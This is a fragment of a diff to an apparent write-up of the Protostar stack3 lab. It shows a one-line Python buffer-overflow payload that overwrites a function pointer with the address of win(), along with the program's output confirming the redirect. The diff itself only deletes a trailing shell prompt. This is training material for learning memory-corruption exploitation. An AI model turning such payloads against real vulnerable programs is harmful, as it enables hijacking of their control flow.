@@ -98,6 +98,5 @@ Filled the **buffer** then appended the string with the address of the **win()**
 user@protostar:/opt/protostar/bin$ (python -c "print 'A'*64 + '\x24\x84\x04\x08'") | ./stack3
 calling function pointer, jumping to 0x08048424
 code flow successfully changed
-user@protostar:/opt/protostar/bin$ 
 ```
 
